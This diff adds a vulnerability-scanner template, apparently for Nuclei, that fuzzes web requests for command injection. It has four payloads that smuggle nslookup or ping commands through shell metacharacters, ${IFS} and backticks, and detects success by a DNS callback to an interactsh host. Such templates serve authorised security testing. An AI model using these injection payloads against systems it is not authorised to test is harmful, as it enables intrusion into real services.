@@ -1,0 +1,26 @@
+id: cmdi_fuzz
+info:
+  name: Command Injection
+  author: abhijit
+  severity: critical
+
+variables:
+  marker: "{{interactsh-url}}"
+
+requests:
+  - raw:
+      - |
+{{RAW_REQUESTS}}
+    payloads:
+      injection:
+        - "127.0.0.1 -c 1;&nslookup {{marker}}&'\\\"`0&nslookup {{marker}}&`'"
+        - "127.0.0.1 -c 1;nslookup${IFS}{{marker}};#${IFS}';nslookup${IFS}{{marker}};#${IFS}\";nslookup${IFS}{{marker}};#${IFS}"
+        - "127.0.0.1 -c 1;/*$(nslookup {{marker}})`nslookup {{marker}}``*/-nslookup({{marker}})-'/*$(nslookup {{marker}})`nslookup {{marker}}` #*/-nslookup({{marker}})||'\"||nslookup({{marker}})||\"/*`*/"
+        - "127.0.0.1 -c 1;%0a${IFS}ping${IFS}-i${IFS}3${IFS}{{marker}}${IFS}%0a"
+
+    stop-at-first-match: true
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
